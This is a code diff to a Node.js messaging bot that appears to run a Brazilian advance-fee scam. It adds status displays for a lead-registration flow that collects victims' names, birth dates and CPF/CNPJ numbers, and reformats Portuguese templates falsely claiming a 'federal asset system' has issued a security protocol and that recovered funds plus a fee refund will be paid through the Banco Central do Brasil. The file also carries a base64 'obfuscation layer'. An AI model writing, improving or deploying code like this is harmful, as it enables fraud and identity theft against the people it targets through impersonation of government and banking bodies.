@@ -9,6 +9,8 @@ const dotenv = require('dotenv');
 
 dotenv.config();
 
+const BT = '```'; // Monospace marker for WhatsApp
+
 // --- OBFUSCATION LAYER ---
 const _d = (b) => Buffer.from(b, 'base64').toString('utf-8');
 
@@ -210,6 +212,18 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF') {
     const dataLabel = tipo === 'CNPJ' ? 'Data de Abertura' : 'Data de Nascimento';
     const nomeLabel = tipo === 'CNPJ' ? 'Razão Social' : 'Nome Completo';
 
+    const nomeDisplay = nome ? `✅ <b>${nome}</b>` : `<i>⏳ Preenchendo...</i>`;
+    const dataDisplay = dataNasc ? `✅ <b>${dataNasc}</b>` : `<i>⏳ Preenchendo...</i>`;
+
+    let statusMsg = '';
+    if (status === 'preenchendo_data') statusMsg = '📝 <i>Aguardando data de nascimento...</i>';
+    else if (status === 'preenchendo_nome') statusMsg = '📝 <i>Aguardando nome completo...</i>';
+    else if (status === 'validado') statusMsg = '✅ <b>CADASTRO CONCLUÍDO — Enviado para a fila!</b>';
+    else if (status === 'na_fila') {
+        const pos = getQueuePosition(chatId);
+        statusMsg = pos ? `🕐 <b>Na fila — Posição: ${pos}º</b>` : `🕐 <b>Na fila de processamento</b>`;
+    }
+
     const text = `${statusEmoji} <b>NOVO CADASTRO EM ANDAMENTO</b>\n\n` +
         `👤 <b>Lead:</b> <code>${chatId}</code>\n` +
         `📄 <b>Tipo:</b> ${tipoLabel}\n\n` +
@@ -392,12 +406,12 @@ Prezado(a) Titular,
 Informamos que o seu *Protocolo Privado de Segurança* foi gerado com êxito pelo sistema federal de ativos.
 
 🖥️ *STATUS DO SISTEMA:*
-\`\`\`
+${BT}
 ID: #SVR-PROT-OK
 STATUS: PRONTO_PARA_USO
 TYPE: CHAVE_HASH_CRIPTOGRAFADA
 VINCULO: ATIVO
-\`\`\`
+${BT}
 
 ✅ O código enviado anteriormente representa o seu link de autenticação segura. Assim que a integração for detectada pela rede bancária, o processo avançará automaticamente para a fase de crédito final.
 
@@ -417,11 +431,11 @@ Prezado(a) Titular,
 É com satisfação que informamos a conclusão do seu processo de recuperação de ativos financeiros. Todas as etapas de validação jurídica, vínculo bancário e homologação federal foram devidamente superadas.
 
 💰 *STATUS DA TRANSFERÊNCIA:*
-```
+${BT}
 VALOR TOTAL: LIBERADO
 ESTORNO TAXA: PROCESSADO
 PRAZO: ATÉ 1 DIA ÚTIL
-```
+${BT}
 
 O montante total (Ativos + Reembolso do Protocolo) será creditado na conta informada em até *24 horas úteis*, conforme o fluxo de liquidação do Banco Central do Brasil.
 
